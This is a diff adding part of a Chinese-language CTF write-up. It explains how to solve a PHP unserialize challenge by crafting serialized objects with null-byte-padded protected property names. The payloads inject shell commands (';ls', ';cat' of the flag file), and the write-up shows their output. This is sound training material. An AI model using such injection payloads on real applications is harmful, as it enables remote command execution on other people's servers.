@@ -141,6 +141,24 @@ print出來的字串是`O:10:"MyFirstCTF":1:{s:4:"test";s:3:";ls";}`
 
 猜測應該是protected的關係
 
+[參考這篇文章](https://www.cnblogs.com/Mrsm1th/p/6835592.html)
+
+所以要加 `\00*\00` 並且加上3(長度) 變成 `O:10:"MyFirstCTF":1:{s:7:"%00*%00test";s:3:";ls";}`
+
+噴出 `Th1s_1S_f1ag__________________y0 index.html index.php`
+
+再丟一波 `O:10:"MyFirstCTF":1:{s:7:"%00*%00test";s:37:";cat Th1s_1S_f1ag__________________y0";}`
+
+解答
+
+:::
+這段很重要 不同類型序列化的值不一樣 但是看起來沒差 以protected 因為是null byte 所以要自己加 '\00*\00' 長度多3
+
+private的参数被反序列化后变成 \00test\00test1 
+public的参数变成 test2   p
+rotected的参数变成 \00*\00test3 
+:::
+
 
 ### 0x03 (math)
 ### 0x04 (math)
